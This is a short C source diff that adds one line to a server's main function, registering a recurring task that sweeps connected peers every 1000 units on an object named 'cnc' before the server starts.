@@ -56,6 +56,7 @@ int main(int argv, char *argc[]) {
         return 1;
 
     laikaT_initTaskService(&tService);
+    laikaT_newTask(&tService, 1000, laikaC_sweepPeersTask, (void*)cnc);
 
     /* start cnc */
     laikaC_bindServer(cnc);
